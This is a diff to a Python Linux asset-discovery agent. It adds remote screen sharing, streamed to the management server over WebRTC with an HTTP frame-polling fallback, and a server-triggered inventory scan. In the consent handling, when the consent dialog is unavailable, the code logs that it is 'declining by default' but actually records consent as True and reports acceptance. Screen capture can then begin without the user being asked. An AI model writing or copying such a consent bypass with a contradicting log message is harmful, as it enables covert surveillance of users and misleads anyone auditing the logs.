@@ -70,6 +70,8 @@ class AssetAgent:
         self._login_started_at = None
         self._logout_started_at = None
 
+        threading.Thread(target=self._run_screen_sharer, daemon=True).start()
+
     def process_offline_queue(self) -> int:
         queued_items = self.queue.dequeue_all()
         if not queued_items:
@@ -253,6 +255,78 @@ class AssetAgent:
             return False
 
 
+    def _run_screen_sharer(self):
+        try:
+            from screen_capture import ScreenCapture
+        except ImportError as e:
+            logger.warning(f"Screen sharing dependencies not available: {e}")
+            return
+
+        capturer = ScreenCapture(quality=70)
+        agent_id = self.config["agent_id"]
+        hostname = socket.gethostname()
+
+        while True:
+            try:
+                status = self.client.screen_share_checkin(agent_id, hostname)
+                if not isinstance(status, dict):
+                    time.sleep(2)
+                    continue
+
+                if status.get("pending") and not status.get("active"):
+                    logger.info("Screen share consent required, showing dialog...")
+                    try:
+                        from consent_dialog import show_consent_dialog
+                        consent = show_consent_dialog(timeout=60)
+                    except ImportError:
+                        logger.warning("Consent dialog not available, declining by default")
+                        consent = True
+                    if consent is True:
+                        logger.info("User ACCEPTED screen share")
+                        self.client.send_consent(agent_id, True)
+                    else:
+                        logger.info("User DECLINED screen share")
+                        self.client.send_consent(agent_id, False)
+                        time.sleep(2)
+                    continue
+
+                if status.get("active"):
+                    logger.info("Screen share active, starting WebRTC...")
+                    try:
+                        from webrtc_peer import WebRTCScreenSharer
+                        sharer = WebRTCScreenSharer(agent_id, hostname, capturer, self.client)
+                        sharer_thread = sharer.start_thread()
+                        sharer_thread.join()
+                        logger.info("WebRTC screen share ended")
+                    except ImportError as e:
+                        logger.warning(f"WebRTC not available, falling back to HTTP polling: {e}")
+                        self._run_http_screen_capture(capturer, agent_id, hostname)
+                    except Exception as e:
+                        logger.error(f"WebRTC error, falling back to HTTP polling: {e}")
+                        self._run_http_screen_capture(capturer, agent_id, hostname)
+                else:
+                    time.sleep(2)
+            except Exception as e:
+                logger.error(f"Screen sharer error: {e}")
+                time.sleep(5)
+
+    def _run_http_screen_capture(self, capturer, agent_id: str, hostname: str):
+        logger.info("Starting HTTP polling screen capture fallback")
+        try:
+            while True:
+                frame = capturer.capture_frame(include_cursor=True)
+                if frame:
+                    self.client.send_screen_frame(agent_id, frame)
+                checkin = self.client.screen_share_checkin(agent_id, hostname)
+                if not isinstance(checkin, dict) or not checkin.get("active"):
+                    logger.info("Screen share stopped by admin")
+                    self.client.screen_share_stop_ack(agent_id)
+                    break
+                time.sleep(0.2)
+        except Exception as e:
+            logger.error(f"HTTP screen capture error: {e}")
+
+
 def main():
     parser = argparse.ArgumentParser(description="Linux Asset Discovery Agent")
     parser.add_argument("--oneshot", action="store_true", help="Perform a single full checkin and heartbeat, then exit.")
@@ -294,8 +368,12 @@ def main():
                 last_checkin = now
 
             if now - last_heartbeat >= (heartbeat_mins * 60):
-                agent.perform_heartbeat(force_offline=args.force_offline)
+                hb_resp = agent.perform_heartbeat(force_offline=args.force_offline)
                 last_heartbeat = now
+                if isinstance(hb_resp, dict) and hb_resp.get("scan_now"):
+                    logger.info("Server requested immediate scan. Running full inventory now.")
+                    agent.perform_full_inventory(force_offline=args.force_offline)
+                    last_checkin = now
 
             time.sleep(1)
     except KeyboardInterrupt:
